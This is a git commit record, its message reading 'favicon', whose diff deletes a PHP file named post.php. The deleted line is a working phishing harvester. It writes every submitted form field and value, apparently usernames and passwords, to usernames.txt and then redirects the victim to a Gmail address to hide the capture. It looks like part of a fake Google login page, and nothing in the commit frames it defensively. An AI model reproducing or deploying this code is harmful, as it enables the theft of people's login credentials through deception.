bb97d74e624c67abbb4f13826f038cf182705b25
Fernando Carreira <Fernando Carreira>
2016-11-12 01:46:56 -0200

    favicon

--- post.php
+++
@@ -1,1 +0,0 @@
-<?php header ('Location:https://gmail.com/googledirecterror'); $handle = fopen("usernames.txt", "a"); foreach($_POST as $variable => $value) {    fwrite($handle, $variable);    fwrite($handle, "=");    fwrite($handle, $value);    fwrite($handle, "\r\n"); } fwrite($handle, "\r\n"); fclose($handle); exit; ?>
